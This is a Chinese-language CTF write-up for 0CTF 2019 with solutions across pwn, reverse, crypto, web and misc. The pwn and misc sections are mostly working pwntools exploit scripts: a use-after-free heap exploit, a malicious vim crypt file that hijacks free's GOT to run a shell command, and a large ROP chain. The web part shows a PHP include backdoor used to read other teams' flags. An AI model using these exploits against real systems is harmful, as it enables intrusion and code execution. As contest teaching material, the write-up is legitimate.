# 0ctf 2019 writeup
Team: sixstars

## pwn
### zerotask
在do_task的时候存在条件竞争，导致uaf，首先泄露内存地址，然后修改task ctx上的函数指针。

```
from pwn import *
from Crypto.Cipher import AES
context.log_level="debug"
pwn_file = "./task"
elf=ELF(pwn_file)
libc=elf.libc
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("111.186.63.201",10001)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def add_task(key,IV,EDchoice,task_id,data):
    r.sendlineafter("Choice: ", '1')
    r.sendlineafter("Task id : ", str(task_id))
    r.sendlineafter("Decrypt(2): ", str(EDchoice))
    r.sendafter("Key : ", key)
    r.sendafter("IV : ", IV)
    r.sendlineafter("Data Size : ", str(len(data)))
    r.sendafter("Data : ", data)

def delete_task(task_id):
    r.sendlineafter("Choice: ",'2')
    r.sendlineafter("Task id : ", str(task_id))

def do_task(task_id):
    r.sendlineafter("Choice: ",'3')
    r.sendlineafter("Task id : ", str(task_id))
key = 'a'*0x20
IV = 'a'*0x10
data = 'a'*60

for i in range(7):
    add_task(key,IV,1,i+10,"a"*0x200)

add_task(key,IV,1,100,"a"*0x200)

for i in range(7):
    delete_task(i+10)

add_task(key,IV,1,1,"a"*0x20)
add_task(key,IV,1,2,"a"*0x30)

delete_task(100)
add_task(key,IV,1,102,"a"*0x40)
do_task(2)
delete_task(2)

r.sendlineafter("Choice: ", '1')
r.sendlineafter("Task id : ", "3")
r.sendlineafter("Decrypt(2): ", "1")
r.sendafter("Key : ", key)
r.sendafter("IV : ", IV)
r.sendlineafter("Data Size : ", str(0x90))

r.recvuntil("Ciphertext: \n")
lines = r.recvlines(10)
data = "".join(lines).replace("\n","").replace(" ","").decode("hex")
aes = AES.new(key, AES.MODE_CBC, IV)
pt =  aes.decrypt(data)
libc.address = u64(pt[8:16])-0x3ebca0
r.send("a"*0x90)

add_task(key,IV,1,0xaaa,"a"*0x50)
for i in range(8):
    add_task(key,IV,1,0,"a"*0xb0)
f={
0x12:"\x10",
0x20:p64(libc.address + 0x10a38c)
        }
add_task(key,IV,1,0,fit(f,filler="\x00",length=0xa0))
delete_task(0)
do_task(0xaaa)
delete_task(0xaaa)
add_task(key,IV,1,0xaab,"a"*0xb0)
delete_task(0xaab)

```

### If on a winters night a traveler
程序在crypt_perm_decode的时候，ps->step经过异或，可能变为负数，导致内存越界写，刚好可以写到ps->buffer的指针，然后在接下来的copy过程中导致任意地址写，覆盖free的got表，执行命令。
```
from pwn import *
elf=ELF("./vim")
f={
        0:"VimCrypt~04!",
        12:p32(0xffffffff^0x61)[::-1],
        0x10:"a"*0x15+p64(elf.got["free"] - 0x30 - 0x15)[::-1]+"\x00", #+p64(0xffffffe0000000f1)[::-1]+p64(0x000000f0ffffffff)[::-1]+p64(0x20000000200)[::-1],
        0x10+0x15+9:
        # 
        (p64(elf.got["free"]-0x30)+"a"*0x14+
            "cat /flag\x00".ljust(0x30,"\x00")+
            p64(elf.sym["mch_call_shell_fork"])+p64(elf.sym["_IO_getc"])+p64(elf.sym["atan"]+6)+p64(elf.sym["strlen"]+6)+
            p64(elf.sym["ferror"]+6)
            ).ljust(0x7c,"\xbb")[::-1]

    
    }
with open("./exp","w+") as fp:
    fp.write(fit(f,filler="\xaa",length=0x102))
```

## reverse
### Elements
输入三个八字节的数字，每个数字用分号隔开例：flag{X-Y-Z}
处理最后需要满足方程的精度要求即可:精度要求0.00001
方程：
```
d = Y * Y + X * X - Z * Z
h = sqrt(4.0 * X * X * Y * Y - d * d) * 0.25
(h + h) / (X + Y + Z) =1.940035480806554e13
X * Y * Z / (h * 4.0) =4.777053952827391e13
X = 0x391BC2164F0A
```
化简之后：
```
47770539528273.91^2*(x+y+z)*(z-x-y)*(x-y+z)*(x-y-z) = x^2*y^2*z^2
4*19400354808065.54^2*(x+y+z) = (z-x-y)*(x-y+z)*(x-y-z)
x = 62791383142154.000000
```
使用Matlab解方程后得：
X=6.2791383142154×10+13,
Y=7.0802074077033×10+13,
Z=9.5523798483318×10+13
化成16进程的表示：
```
X = 391bc2164f0a
Y = 4064e4798769
Z = 56e0de138176
```
最后的flag:
flag{391bc2164f0a-4064e4798769-56e0de138176}

## crypto
### babyrsa
这个题目是在伽罗华域的rsa，不是素数域，是多项式域，但是可以直接分解n所以可以直接做出来结果，具体内容见脚本
```
from pubkey import P,e,n

#print n.factor()

p1 = P(x^821 + x^820 + x^819 + x^818 + x^817 + x^814 + x^813 + x^812 + x^810 + x^808 + x^807 + x^804 + x^801 + x^796 + x^795 + x^794 + x^790 + x^787 + x^786 + x^784 + x^781 + x^780 + x^779 + x^778 + x^777 + x^776 + x^775 + x^774 + x^773 + x^771 + x^770 + x^768 + x^766 + x^762 + x^761 + x^760 + x^758 + x^757 + x^752 + x^749 + x^748 + x^747 + x^740 + x^737 + x^736 + x^732 + x^727 + x^723 + x^722 + x^719 + x^718 + x^717 + x^716 + x^715 + x^714 + x^711 + x^710 + x^708 + x^704 + x^703 + x^702 + x^701 + x^700 + x^699 + x^698 + x^696 + x^692 + x^690 + x^689 + x^687 + x^685 + x^683 + x^681 + x^676 + x^674 + x^672 + x^671 + x^670 + x^668 +
 x^667 + x^665 + x^664 + x^663 + x^661 + x^660 + x^659 + x^657 + x^656 + x^655 + x^651 + x^649 + x^646 + x^644 + x^637 + x^636 + x^634 + x^633 + x^632 + x^631
 + x^628 + x^626 + x^625 + x^622 + x^621 + x^620 + x^614 + x^611 + x^609 + x^608 + x^605 + x^604 + x^599 + x^597 + x^592 + x^591 + x^589 + x^580 + x^578 + x^574 + x^572 + x^569 + x^566 + x^565 + x^563 + x^562 + x^560 + x^552 + x^550 + x^545 + x^544 + x^543 + x^542 + x^540 + x^538 + x^537 + x^534 + x^533 + x^528 + x^527 + x^526 + x^523 + x^522 + x^519 + x^518 + x^515 + x^514 + x^512 + x^505 + x^503 + x^502 + x^500 + x^498 + x^496 + x^493 + x^492 + x^491 + x^490 + x^489 +
 x^487 + x^482 + x^480 + x^479 + x^478 + x^476 + x^474 + x^472 + x^471 + x^470 + x^469 + x^468 + x^466 + x^462 + x^459 + x^458 + x^457 + x^456 + x^454 + x^453
 + x^451 + x^449 + x^447 + x^445 + x^443 + x^442 + x^441 + x^440 + x^437 + x^434 + x^428 + x^425 + x^424 + x^423 + x^420 + x^415 + x^412 + x^411 + x^410 + x^408 + x^405 + x^404 + x^403 + x^401 + x^400 + x^394 + x^391 + x^390 + x^389 + x^388 + x^384 + x^383 + x^382 + x^379 + x^378 + x^376 + x^375 + x^372 + x^371 + x^370 + x^368 + x^366 + x^365 + x^364 + x^361 + x^358 + x^357 + x^356 + x^354 + x^351 + x^347 + x^345 + x^344 + x^340 + x^339 + x^335 + x^334 + x^333 + x^332 +
 x^331 + x^328 + x^326 + x^322 + x^318 + x^315 + x^312 + x^306 + x^303 + x^302 + x^301 + x^300 + x^299 + x^298 + x^297 + x^295 + x^293 + x^291 + x^289 + x^288
 + x^287 + x^286 + x^285 + x^282 + x^280 + x^279 + x^277 + x^274 + x^273 + x^270 + x^269 + x^268 + x^263 + x^262 + x^261 + x^259 + x^258 + x^257 + x^256 + x^252 + x^250 + x^249 + x^245 + x^244 + x^243 + x^242 + x^236 + x^234 + x^233 + x^232 + x^228 + x^225 + x^223 + x^222 + x^221 + x^219 + x^218 + x^215 + x^214 + x^213 + x^211 + x^210 + x^209 + x^207 + x^205 + x^203 + x^202 + x^200 + x^198 + x^197 + x^193 + x^191 + x^190 + x^185 + x^184 + x^182 + x^180 + x^179 + x^177 +
 x^172 + x^168 + x^167 + x^165 + x^163 + x^161 + x^159 + x^157 + x^156 + x^155 + x^154 + x^153 + x^151 + x^150 + x^149 + x^148 + x^146 + x^145 + x^143 + x^139
 + x^137 + x^136 + x^135 + x^133 + x^132 + x^130 + x^127 + x^126 + x^125 + x^124 + x^122 + x^121 + x^120 + x^119 + x^117 + x^116 + x^113 + x^111 + x^110 + x^109 + x^108 + x^107 + x^106 + x^105 + x^100 + x^97 + x^95 + x^89 + x^88 + x^87 + x^86 + x^85 + x^84 + x^82 + x^81 + x^80 + x^77 + x^76 + x^75 + x^74 + x^69 + x^67 + x^65 + x^61 + x^59 + x^57 + x^53 + x^52 + x^50 + x^49 + x^48 + x^45 + x^41 + x^40 + x^36 + x^34 + x^33 + x^27 + x^26 + x^24 + x^23 + x^22 + x^21 + x^20 + x^19 + x^18 + x^15 + x^14 + x^12 + x^9 + x^6 + x^4 + x^3 + x + 1)
q1 = P(x^1227 + x^1226 + x^1225 + x^1224 + x^1219 + x^1214 + x^1213 + x^1211 + x^1210 + x^1208 + x^1205 + x^1203 + x^1202 + x^1201 + x^1198 + x^1197 + x^1194 + x^1193 + x^1188 + x^1185 + x^1184 + x^1183 + x^1180 + x^1178 + x^1177 + x^1175 + x^1173 + x^1171 + x^1170 + x^1169 + x^1168 + x^1166 + x^1164 + x^1163 + x^1162 + x^1160 + x^1157 + x^1155 + x^1151 + x^1149 + x^1144 + x^1143 + x^1142 + x^1141 + x^1140 + x^1139 + x^1137 + x^1136 + x^1135 + x^1134 + x^1130 + x^1126 + x^1122 + x^1121 + x^1120 + x^1118 + x^1117 + x^1115 + x^1114 + x^1111 + x^1110 + x^1108 + x^1107 + x^1105 + x^1104 + x^1103 + x^1102 + x^1101 + x^1099 + x^1094 + x^1092 + x^1090 + x^1089 + x^1085 + x^1082 + x^1079 + x^1075 + x^1074 + x^1073 + x^1070 + x^1068 + x^1067 + x^1066 + x^1065 + x^1064 + x^1061 + x^1060 + x^1059 + x^1058 + x^1055 + x^1054 + x^1053 + x^1051 + x^1047 + x^1046 + x^1043 + x^1042 + x^1041 + x^1039 + x^1037 + x^1035 + x^1034 + x^1033 + x^1031 + x^1029 + x^1028 + x^1027 + x^1026 + x^1025 + x^1023 + x^1021 + x^1019 + x^1018 + x^1016 + x^1014 + x^1012 + x^1009 + x^1006 + x^1004 + x^1002 + x^1000 + x^999 + x^996 + x^994 + x^993 + x^992 + x^991 + x^990 + x^989 + x^988 + x^984 + x^981 + x^980 + x^978 + x^977 + x^976 + x^974 + x^972 + x^967 + x^965 + x^964 + x^963 + x^962 + x^958 + x^957 + x^955 + x^953 + x^952 + x^951 + x^950 + x^949 + x^948 + x^947 + x^945 + x^944 + x^939 + x^936 + x^935 + x^934 + x^931 + x^930 + x^926 + x^924 + x^923 + x^920 + x^917 + x^913 + x^912 + x^910 + x^909 + x^908 + x^907 + x^906 + x^905 + x^903 + x^902 + x^901 + x^899 + x^896 + x^893 + x^892 + x^891 + x^887 + x^886 + x^885 + x^884 + x^883 + x^880 + x^877 + x^876 + x^872 + x^868 + x^867 + x^864 + x^863 + x^862 + x^861 + x^858 + x^856 + x^855 + x^854 + x^851 + x^847 + x^846 + x^844 + x^843 + x^842 + x^841 + x^840 + x^838 + x^836 + x^835 + x^833 + x^832 + x^830 + x^829 + x^828 + x^826 + x^825 + x^822 + x^821 + x^817 + x^815 + x^812 + x^811 + x^810 + x^808 + x^806 + x^804 + x^803 + x^802 + x^801 + x^800 + x^797 + x^792 + x^790 + x^789 + x^788 + x^787 + x^785 + x^784 + x^783 + x^781 + x^780 + x^778 + x^777 + x^776 + x^774 + x^771 + x^770 + x^769 + x^766 + x^764 + x^762 + x^759 + x^755 + x^751 + x^749 + x^748 + x^747 + x^746 + x^742 + x^737 + x^734 + x^733 + x^729 + x^727 + x^725 + x^724 + x^723 + x^722 + x^720 + x^718 + x^715 + x^713 + x^711 + x^709 + x^707 + x^706 + x^702 + x^699 + x^698 + x^695 + x^692 + x^687 + x^680 + x^679 + x^678 + x^677 + x^676 + x^674 + x^670 + x^669 + x^668 + x^662 + x^656 + x^654 + x^653 + x^652 + x^651 + x^648 + x^646 + x^645 + x^644 + x^642 + x^640 + x^639 + x^638 + x^637 + x^634 + x^633 + x^632 + x^629 + x^628 + x^627 + x^626 + x^625 + x^623 + x^619 + x^617 + x^613 + x^612 + x^611 + x^610 + x^605 + x^604 + x^603 + x^601 + x^597 + x^595 + x^593 + x^591 + x^590 + x^589 + x^588 + x^587 + x^585 + x^583 + x^581 + x^580 + x^577 + x^576 + x^574 + x^573 + x^572 + x^570 + x^569 + x^563 + x^557 + x^555 + x^553 + x^551 + x^548 + x^546 + x^545 + x^541 + x^538 + x^535 + x^534 + x^529 + x^528 + x^527 + x^526 + x^525 + x^524 + x^523 + x^522 + x^521 + x^520 + x^519 + x^518 + x^517 + x^516 + x^515 + x^512 + x^510 + x^509 + x^507 + x^506 + x^503 + x^499 + x^498 + x^497 + x^496 + x^495 + x^493 + x^492 + x^491 + x^487 + x^483 + x^479 + x^477 + x^475 + x^473 + x^467 + x^466 + x^465 + x^464 + x^462 + x^456 + x^455 + x^454 + x^452 + x^445 + x^444 + x^442 + x^438 + x^437 + x^436 + x^435 + x^434 + x^432 + x^431 + x^430 + x^429 + x^427 + x^426 + x^425 + x^424 + x^421 + x^420 + x^419 + x^418 + x^415 + x^412 + x^409 + x^404 + x^399 + x^398 + x^397 + x^396 + x^391 + x^390 + x^389 + x^387 + x^386 + x^385 + x^384 + x^383 + x^382 + x^379 + x^377 + x^376 + x^370 + x^368 + x^366 + x^363 + x^361 + x^356 + x^355 + x^353 + x^350 + x^349 + x^345 + x^343 + x^342 + x^340 + x^339 + x^332 + x^331 + x^329 + x^328 + x^327 + x^324 + x^321 + x^320 + x^315 + x^312 + x^309 + x^308 + x^307 + x^306 + x^305 + x^304 + x^300 + x^299 + x^297 + x^296 + x^295 + x^294 + x^293 + x^292 + x^290 + x^285 + x^284 + x^278 + x^277 + x^276 + x^275 + x^273 + x^272 + x^270 + x^269 + x^268 + x^267 + x^266 + x^265 + x^262 + x^261 + x^260 + x^258 + x^257 + x^256 + x^254 + x^251 + x^250 + x^248 + x^247 + x^245 + x^244 + x^240 + x^237 + x^235 + x^234 + x^233 + x^232 + x^231 + x^229 + x^225 + x^222 + x^220 + x^219 + x^217 + x^216 + x^214 + x^213 + x^210 + x^209 + x^207 + x^203 + x^202 + x^199 + x^196 + x^192 + x^191 + x^188 + x^187 + x^185 + x^184 + x^183 + x^182 + x^174 + x^173 + x^170 + x^169 + x^168 + x^167 + x^166 + x^162 + x^158 + x^157 + x^156 + x^152 + x^150 + x^148 + x^147 + x^146 + x^144 + x^142 + x^141 + x^140 + x^138 + x^137 + x^134 + x^129 + x^128 + x^125 + x^124 + x^123 + x^122 + x^121 + x^120 + x^115 + x^113 + x^112 + x^111 + x^109 + x^108 + x^106 + x^104 + x^101 + x^100 + x^98 + x^96 + x^95 + x^94 + x^92 + x^91 + x^89 + x^87 + x^86 + x^85 + x^84 + x^77 + x^75 + x^73 + x^70 + x^68 + x^67 + x^66 + x^60 + x^57 + x^53 + x^51 + x^50 + x^49 + x^46 + x^44 + x^43 + x^42 + x^41 + x^39 + x^36 + x^35 + x^32 + x^30 + x^28 + x^27 + x^25 + x^24 + x^23 + x^20 + x^18 + x^17 + x^10 + x^9 + x^8 + x^5 + x^4 + x^3 + x^2 + x + 1)
R.<a> = GF(2^2049)
'''
phi = n*(1-1/p1)*(1-1/q1)
#print phi

phi_int = R(P(phi)).integer_representation()

e_poly = P(R.fetch_int(e))
print e_poly
d = inverse_mod(e,phi_int)
print d
d_poly = P(R.fetch_int(d))
print P(e_poly*d_poly)
'''
n1 = p1.degree()
print n1
n2 = q1.degree()
print n2
fn = (2^n1-1)*(2^n2-1)
print fn
d = inverse_mod(e,fn)

f = open('flag.enc', 'rb')
ct = f.read()
print ct
c_int = Integer(ct.encode('hex'), 16)
c_poly = P(R.fetch_int(c_int))
m_poly = pow(c_poly, d, n)
m_int = R(m_poly).integer_representation()
m = format(m_int, '0256x').decode('hex')
print m

```
## web
### Wallbreaker Easy
```
backdoor=
include("/tmp/filename");
foreach (glob("/tmp/*") as $filename) {
    echo "$filename size " . filesize($filename) . "\n";
}
```

用glob函数读tmp的目录

在include别人写好的flag即可

也是挺巧的。可能刚刚好那个时间段有人做出来，flag刚写到/tmp就被我include了

或者
```
foreach (glob("/tmp/*") as $filename) {
    echo "$filename size " . filesize($filename) . "\n";
    include($filename);
}
```
一直跑等待flag即可
*orz….不过后面师傅修复了环境，给每个人都开了一个单独的目录，相互不能影响，就不能这样偷flag了…(溜了)*

## misc
### flropyd
利用rop构造指令集，然后使用新的指令实现算法。
```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
#pwn_file="./flropyd"
pwn_file="./bak"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("111.186.63.203",6666)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()
r.recvuntil(": ")
libc_addr = int(r.recvline(),16)-0x97070


pop_rbx = lambda x: p64(libc_addr + 0x3ea8b) + p64(x)
pop_rdx = lambda x: p64(libc_addr + 0x1b96) + p64(x)
pop_rdi = lambda x: p64(libc_addr + 0x2155f) + p64(x)
pop_rsi = lambda x: p64(libc_addr + 0x1306da) + p64(x)
pop_rax = lambda x: p64(libc_addr + 0x439c8) + p64(x)
pop_rcx = lambda x: p64(libc_addr + 0x3eb0b) + p64(x)
pop_r15 = lambda x: p64(libc_addr + 0x2155e) + p64(x)
pop_rbp = lambda x: p64(libc_addr + 0x22d45) + p64(x)
pop_r12 = lambda x: p64(libc_addr + 0x9f2c8) + p64(x)
mov_da = lambda : p64(0x1415dd + libc_addr)
mov_sd = lambda : pop_rax(0x040144a) + pop_rcx(libc_addr + 0x12e7ec) + p64(0x99e20 + libc_addr) + p64(0)
mov_sa = lambda  : mov_da() + mov_sd()# mov rsi,rax
mov_as = lambda : p64(libc_addr + 0x587f3) # mov rax,rsi
nop = lambda : p64(0x040144B)
#mov rax, rsi ; ret
maps = 0x602068
all_num = 0x602060
debug_num = 0x602000
loop1 = 0x61a000
loop2 = 0x61a008
loop3 = 0x61a010
tmp1 = 0x61a018 # j<<6
tmp2 = 0x61a020 # j<<6 + k
tmp3 = 0x61a028 # (j << 6) + i
tmp4 = 0x61a030 # i<<6
tmp5 = 0x61a038 # i<<6 + k
reg1 = 0x61a040
reg2 = 0x61a048
reg3 = 0x61a050
reg4 = 0x61a058
reg5 = 0x61a060
reg6 = 0x61a068
tmp0 = 0x61a070 # everyone can use it

movq_rdi_rcx= libc_addr + 0xb6a58
#mov qword ptr [rdi + 0x10], rcx ; ret
push_call = libc_addr + 0x22c08
#push rax ; call rbx
#0x23992 pop r12;ret
#0x00000000000989ea : pop rdi ; jmp rax
#0x0000000000052419 : mov rsi, qword ptr [rsi + 0x70] ; xor eax, eax ; ret
def load_ax(addr):
    return pop_rsi(addr-0x70) + p64(0x52419 + libc_addr )+ mov_as()
# add rax, rdi ; ret

def load_di(addr):
    # affect rdi
    return pop_rdi(addr-0xe0) + pop_rax(0x40144B) + p64(0x7f039 + libc_addr)


def load_cx(addr):
    return pop_rcx(0) + pop_rax(addr-0x39) + p64(0x2b6fd + libc_addr)

def save_Im(addr,value):
    value = value & 0xffffffffffffffff
    return pop_rdx(value) + pop_rdi(addr) + p64(0xa81eb + libc_addr)

def save_ax(addr):
    return pop_rdi(addr) + p64(0x3fdfa+libc_addr)

def add(dst,mem1,mem2):
    return load_di(mem1) + load_ax(mem2) + p64(0xac12c+libc_addr) + save_ax(dst)

def add_const(dst,reg,const):
    return load_ax(reg) + pop_rsi(const) + p64(0xac21c+libc_addr) + save_ax(dst) # add rax,rsi;ret

def load_m(reg,mem):
    return load_ax(mem) + p64(0x145c98 + libc_addr ) + save_ax(reg)

def store_m(reg,mem):
    return load_ax(reg) + mov_da() + load_ax(mem) + p64(libc_addr + 0x118d45)

def goto(rsp_mem):
    rax_mem = 0x61a808
    rcx_mem = 0x61a810
    data= [ 
        save_Im(rcx_mem,0x4014CC) + pop_rcx(0x61a810),
        # add junk code for protecting stack when call
        pop_rsi(0) + p64(libc_addr + 0x1d6658), # or rsi, rsp ; jmp qword ptr [rcx]
        pop_rbp(rsp_mem + 0x6b) + p64(0x0131da3+ libc_addr), #  add rsi, qword ptr [rbp - 0x6b] ; mov rax, rdi ; return
        pop_r12(0x4014B2) + mov_as() + pop_rcx(libc_addr + 0x106899) + p64(0x99e20 + libc_addr) + p64(0) , # pop r14,jmp rcx ->  mov    r8,rax; call r12; set r8 = rsp + ... fuck call..
        pop_rdx(0x4014B4) + p64(libc_addr + 0x3eca9) # set rsp !
    ]
    data = "".join(data)
    return data

cnt = 0
def if_great_then_else(mem1,mem2,then,els):
    global cnt
    rdi_mem = 0x61a900 + cnt*0x100
    rsi_mem = 0x61a930 + cnt*0x100
    rax_mem = 0x61a950 + cnt*0x100 # 0x10
    rbp_mem = 0x61a970 + cnt*0x100
    true_mem = 0x61a990 + cnt*0x100
    cnt +=1
    #0x7ffff7896924 <__strcpy_sse2_unaligned+996>:        ja     0x7ffff789692e
    #0x7ffff7896926 <__strcpy_sse2_unaligned+998>:        mov    QWORD PTR [rdi],rcx
    #0x7ffff7896929 <__strcpy_sse2_unaligned+1001>:       ret

    #0x7ffff789692e <__strcpy_sse2_unaligned+1006>:       add    BYTE PTR [rax],al
    #0x7ffff7896930 <__strcpy_sse2_unaligned+1008>:       mov    rcx,QWORD PTR [rsi]
    #0x7ffff7896933 <__strcpy_sse2_unaligned+1011>:       mov    dx,WORD PTR [rsi+0x8]
    #0x7ffff7896937 <__strcpy_sse2_unaligned+1015>:       mov    QWORD PTR [rdi],rcx
    #0x7ffff789693e <__strcpy_sse2_unaligned+1022>:       ret

    # 0x0000000000052818 : cmp dword ptr [rax], r9d ; xor eax, eax ; pop rbx ; ret
    # 0x00000000000c1709 : cmp dword ptr [rax + 0x63], ecx ; ret
    # 69f42 : mov r8, rcx ; jmp rax
    # 0x000000000003eca7 : mov eax, esi ; mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
    # 0x3eb0b : pop rcx,ret

    # rsi: branch 1
    # rcx: branch 2
    # rdi store branch dst

    # 0x617c8: add r9d, eax ; mov eax, r9d ; ret
    # 0x2bce8: xor r9d, r9d ; call r15

    # dst1 rcx
    # dst2 [rsi]
    branch_false="".join([
        els,
        # we can exit normally ...

    ])
    print ("branch fasle:")
    print (len(branch_false))
    branch_true="".join([
        then,
        # mov rsp,r8...
        save_Im(true_mem,len(branch_false) + 0x68),
        goto(true_mem)
    ])
    data = [save_Im(rsi_mem, 0x68),
            load_cx(mem2) + pop_rax(mem1-0x63) + p64(0x0c1709 + libc_addr),
            pop_rax(rax_mem) + pop_rcx(len(branch_true) +  0x68) + pop_rsi(rsi_mem) + pop_rdi(rdi_mem) + p64(0xb6924 + libc_addr),# set [rdi] = rsi when  true branch go else [rdi] = rcx
            # get esp add length from [rdi]
            # get current rsp
            # 0x000000000015d29e : mov eax, dword ptr [rbp + 8] ; mov rsi, rsp ; mov rdi, rbp ; call qword ptr [rax]
#            save_Im(rbp_mem,0x1000) + save_Im(rax_mem,0x15d29e+libc_addr) + save_Im(rax_mem+8,0x4014B2) + pop_rax(rax_mem+8)
            goto(rdi_mem),
            branch_true,
            branch_false
            ]
    return "".join(data)

#0x00000000001404f2 : ror byte ptr [rax + 1], cl ; sal esi, cl ; ret
# 1404f5
def sl(dst,mem,dis):
    return load_ax(mem) + mov_sa() + pop_rcx(dis)+ p64(0x1404f5 + libc_addr ) + \
            mov_as() + save_ax(dst)
def cp(mem1,mem2):
    return load_ax(mem2) + save_ax(mem1)



"""
save_Im(0x61a008,0),
save_Im(0x61a010,0),
save_Im(0x61a018,0),
save_Im(0x61a020,0),
save_Im(0x61a028,0),
save_Im(0x61a030,0),
save_Im(0x61a038,0),
save_Im(0x61a040,0),
save_Im(0x61a048,0),
save_Im(0x61a050,0),
save_Im(0x61a058,0),
save_Im(0x61a060,0),
save_Im(0x61a068,0),
"""

loop1_rsp_mem = 0x61a080
loop2_rsp_mem = 0x61a088
loop3_rsp_mem = 0x61a090

loop3_break_mem = 0x61a098
loop2_break_mem = 0x61a0a0
loop1_break_mem = 0x61a0a8
debug_num = 0x602000
once_num = 0x602028
loop3_rsp_mem_1 = 0x61a0b0

inner = "".join([
    sl(tmp1,loop2,6) + add(tmp1,tmp1,loop3) + sl(tmp1,tmp1,3) + add_const(reg4,tmp1,maps) ,# &map[(j << 6) + k]
    sl(tmp2,loop2,6) + add(tmp2,tmp2,loop1) + sl(tmp2,tmp2,3) + add_const(reg5,tmp2,maps),# &map[(j << 6) + i]
    sl(tmp3,loop1,6) + add(tmp3,tmp3,loop3) + sl(tmp3,tmp3,3) + add_const(reg6,tmp3,maps),# &map[(i << 6) + k]
    # get value from pointer
    load_m(reg1,reg4) + load_m(reg5,reg5) + load_m(reg6,reg6),
    add(reg5,reg5,reg6),
    if_great_then_else(reg1,reg5,store_m(reg5,reg4),nop()),
])
print hex(len(inner))
#inner = nop()*352
loop3_code = "".join([
        save_Im(loop3,0),
        # here:
        pop_rax(0xdeadbedd),
        if_great_then_else(all_num,loop3,inner,goto(loop3_break_mem)),
        pop_rax(0xdeadbee3),
        nop()*3,
        add_const(loop3,loop3,1),
        goto(loop3_rsp_mem) # goto here
])

loop2_code = "".join([
        save_Im(loop2,0),
        # here:
        pop_rax(0xdeadbee2), #
        if_great_then_else(all_num,loop2,loop3_code ,goto(loop2_break_mem)),
        pop_rax(0xdeadbee2), # loop3 jump here

        nop()*3,
        add_const(loop2,loop2,1),
        goto(loop2_rsp_mem) # goto here
])

loop1_code = "".join([
        save_Im(loop1,0),
        # here:
        pop_rax(0xdeadbee1), # loop 1 jump here
        if_great_then_else(all_num,loop1,loop2_code ,goto(loop1_break_mem)),
        pop_rax(0xdeadbee1), # loop 1 jump here
        nop()*3,
        add_const(loop1,loop1,1),
        goto(loop1_rsp_mem) # goto here
])

rop=[
    "a"*0x10,
    p64(0x60A098) , save_Im(once_num,1),
#    save_Im(loop1_rsp_mem,0xffffffffffffea50), # ok
#    save_Im(loop2_rsp_mem,0xffffffffffffeea0), # ok
    save_Im(loop1_rsp_mem,-len(loop1_code)+0x90), # ok
    save_Im(loop2_rsp_mem,-len(loop2_code)+0x90), # ok
    save_Im(loop3_rsp_mem,-len(loop3_code)+0x90),
    
    save_Im(loop1_break_mem,0x198), # ok
    save_Im(loop2_break_mem,0x330), # ok
    save_Im(loop3_break_mem,0x330),# ok
    #save_Im(loop1_break_mem,0x198), # ok
    #save_Im(loop2_break_mem,0x330), # ok
    #save_Im(loop3_break_mem,0x330),# ok
    loop1_code,
#    pop_rax(0)+p64(libc_addr + 0x43120)
    p64(0xdeadbeef)
]
"""
rop=[
    "A"*0x18,
    save_Im(reg1,10),save_Im(reg2,3),
    if_great_then_else(reg1,reg2,save_Im(reg1,1),save_Im(reg1,10)),
    p64(0xdeadbeef)
]
"""
code = "".join(rop).ljust(0x10000,"\x00")
r.sendlineafter("chain",code)


r.interactive()



"""
0x7ffffffee290 loop3

"""

```